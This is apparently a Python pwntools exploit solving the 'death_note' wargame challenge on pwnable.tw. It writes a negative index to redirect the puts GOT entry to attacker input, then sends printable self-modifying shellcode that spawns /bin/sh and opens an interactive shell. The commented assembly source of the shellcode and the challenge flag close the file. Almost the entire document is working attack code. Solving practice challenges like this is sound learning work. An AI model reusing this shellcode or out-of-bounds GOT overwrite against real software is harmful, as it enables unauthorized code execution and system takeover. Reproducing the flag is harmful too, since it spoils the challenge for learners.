#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

def conn():
	local = 0
	debug = 0

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./death_note')
		if debug:
			gdb.attach(s, gdbscript='''
				b*0x08048726
				b*0x080487EF
				c
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('chall.pwnable.tw', 10201)

	return s

s = conn()

binary = ELF('death_note')

s.sendlineafter(b'Your choice :', b'1')

s.sendlineafter(b'Index :', b'-16')
# Must be -16 puts to use edx is the address of shellcode

shellcode = b'\x6a\x55\x58\x24\x2a\x50\x59\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x68\x74\x74\x74\x74\x58\x28\x42\x31\x28\x42\x32\x68\x4d\x4d\x4d\x4d\x58\x28\x42\x32\x51\x58\x51\x5a\x34\x6b\x34\x60'

s.sendlineafter(b'Name :', shellcode + b'AA')

s.interactive()
#FLAG{sh3llc0d3_is_s0_b34ut1ful}

'''
section .text
	global _start

_start:
	push 0x55
	pop eax
	and al, 0x2a

	push eax
	pop ecx
	push eax

	push 0x68732f2f
	push 0x6e69622f
	push esp
	pop ebx

	push 0x74747474
	pop eax
	sub byte [edx + 0x31] , al
	sub byte [edx + 0x32] , al
	push 0x4d4d4d4d
	pop eax
	sub byte [edx + 0x32] , al

	push ecx
	pop eax
	push ecx
	pop edx

	xor al, 0x6b
	xor al, 0x60
'''
